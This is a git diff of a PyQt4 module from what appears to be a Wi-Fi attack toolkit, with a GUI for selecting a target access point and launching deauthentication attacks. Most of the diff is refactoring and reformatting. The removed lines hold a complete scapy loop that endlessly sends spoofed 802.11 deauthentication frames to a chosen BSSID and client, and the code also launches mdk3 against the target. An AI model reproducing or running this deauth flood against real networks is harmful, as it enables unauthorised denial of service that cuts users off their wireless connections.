@@ -16,15 +16,13 @@
 #CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
-from subprocess import Popen,PIPE
 from scapy.all import *
 import threading
-from os import popen,system,getuid,path,makedirs
-from re import search,compile,match
+from os import popen,path,makedirs
+from re import search
 from Core.Settings import frm_Settings
 from Modules.utils import Refactor,ProcessThread,airdump_start,get_network_scan,set_monitor_mode
 from multiprocessing import Process
-from subprocess import Popen,PIPE,STDOUT,call,check_output
 threadloading = {'deauth':[],'mdk3':[]}
 
 
@@ -46,8 +44,8 @@ class frm_window(QMainWindow):
     def closeEvent(self, event):
         global threadloading
         if len(threadloading['deauth']) != 0 or len(threadloading['mdk3']) != 0:
-            reply = QMessageBox.question(self, 'About Exit',"Are you sure to quit?", QMessageBox.Yes |
-                QMessageBox.No, QMessageBox.No)
+            reply = QMessageBox.question(self, 'About Exit',"Are you sure to quit?",
+            QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
             if reply == QMessageBox.Yes:
                 event.accept()
                 for i in threadloading['deauth']:
@@ -55,30 +53,28 @@ class frm_window(QMainWindow):
                     print("[*] Deuath Thread Terminate")
                 for i in threadloading['mdk3']:
                     i.stop(),i.join()
-
                 self.deleteLater()
-            else:
-                event.ignore()
+                return
+            event.ignore()
 
 
 class frm_deauth(QWidget):
     def __init__(self, parent=None):
         super(frm_deauth, self).__init__(parent)
-        self.Main = QVBoxLayout()
-        self.xmlcheck = frm_Settings()
-        self.interface = self.xmlcheck.xmlSettings("interface", "monitor_mode", None, False)
-        self.ApsCaptured = {}
-        self.pacote = []
-        self.data = {'Bssid':[], 'Essid':[], 'Channel':[]}
+        self.Main           = QVBoxLayout()
+        self.xmlcheck       = frm_Settings()
+        self.interface      = self.xmlcheck.xmlSettings("interface", "monitor_mode", None, False)
+        self.ApsCaptured    = {}
+        self.pacote         = []
+        self.data           = {'Bssid':[], 'Essid':[], 'Channel':[]}
         self.window_qt()
 
     def select_target(self):
         item = self.tables.selectedItems()
         if item != []:
             self.linetarget.setText(item[2].text())
-        else:
-            QMessageBox.critical(self, "Error in row", "Nothing row in tables, please try scan network again")
-            self.linetarget.clear()
+            return
+        self.linetarget.clear()
 
     def window_qt(self):
         self.mForm = QFormLayout()
@@ -196,7 +192,6 @@ class frm_deauth(QWidget):
         for i in threadloading['mdk3']:
             i.stop(),i.join()
         self.AttackStatus(False)
-        print("[*] deauth Attack OFF")
 
     def SettingsScan(self):
         self.data = {'Bssid':[], 'Essid':[], 'Channel':[]}
@@ -240,24 +235,25 @@ class frm_deauth(QWidget):
 
     def attack_deauth(self):
         global threadloading
-        if self.linetarget.text() == "":
-            QMessageBox.information(self, "Target Error", "Please, first select Target for attack")
+        if self.linetarget.text() == '':
+            QMessageBox.information(self, 'Target Error', 'Please, first select Target for attack')
         else:
             self.bssid = str(self.linetarget.text())
-            self.deauth_check = self.xmlcheck.xmlSettings("deauth", "select",None,False)
-            self.args = str(self.xmlcheck.xmlSettings("mdk3","arguments", None, False))
-            if self.deauth_check == "packets_scapy":
+            self.deauth_check = self.xmlcheck.xmlSettings('deauth', 'select',None,False)
+            self.args = str(self.xmlcheck.xmlSettings('mdk3','arguments', None, False))
+            self.interface = str(set_monitor_mode(self.get_placa.currentText()).setEnable())
+            if self.deauth_check == 'packets_scapy':
                 self.AttackStatus(True)
-                t = Process(target=self.deauth_attacker, args=(self.bssid,str(self.input_client.text())))
-                print("[*] deauth Attack On:"+self.bssid)
+                t = Process(target=self.deauth_attacker, args=(self.bssid,
+                str(self.input_client.text()),self.interface))
                 threadloading['deauth'].append(t)
                 t.daemon = True
                 t.start()
             else:
                 if path.isfile(popen('which mdk3').read().split("\n")[0]):
                     self.AttackStatus(True)
-                    t = ProcessThread(("mdk3 %s %s %s"%(self.interface,self.args,self.bssid)).split())
-                    t.name = "mdk3"
+                    t = ProcessThread(('mdk3 %s %s %s'%(self.interface,self.args,self.bssid)).split())
+                    t.name = 'Thread mdk3'
                     threadloading['mdk3'].append(t)
                     t.start()
                 else:
@@ -266,27 +262,15 @@ class frm_deauth(QWidget):
 
     def AttackStatus(self,bool):
         if bool:
-            self.Controlador.setText("[ON]")
+            self.Controlador.setText('[ON]')
             self.Controlador.setStyleSheet("QLabel {  color : green; }")
         else:
-            self.Controlador.setText("[OFF]")
+            self.Controlador.setText('[OFF]')
             self.Controlador.setStyleSheet("QLabel {  color : red; }")
         self.statusbar.addWidget(self.Controlador)
 
-    def deauth_attacker(self,bssid, client):
-        conf.verb = 0
-        conf.iface = self.interface
-        pkts = []
-        pkt1 = RadioTap()/Dot11(type=0,
-        subtype=12,addr1=client,
-        addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
-        pkt2 = Dot11(addr1=bssid, addr2=client,
-        addr3=client)/Dot11Deauth()
-        pkts.append(pkt1)
-        pkts.append(pkt2)
-        while True:
-            for i in pkts:
-                sendp(i,verbose=False,count=1)
+    def deauth_attacker(self,bssid, client,interface):
+        Refactor.deauth(bssid,client,interface)
 
     @pyqtSlot(QModelIndex)
     def list_clicked(self, index):
@@ -294,8 +278,8 @@ class frm_deauth(QWidget):
         for i in itms:
             attack = str(i.data().toString()).split()
             for i in attack:
-                if Refactor.check_is_mac(i.replace(" ", "")):
+                if Refactor.check_is_mac(i.replace(' ', '')):
                     self.linetarget.setText(str(i))
-            if self.linetarget.text() == "":
-                QMessageBox.information(self, "MacAddress",
-                                        "Error check the Mac Target, please set the mac valid.")
+            if self.linetarget.text() == '':
+                QMessageBox.information(self, 'MacAddress',
+                'Error check the Mac Target, please set the mac valid.')
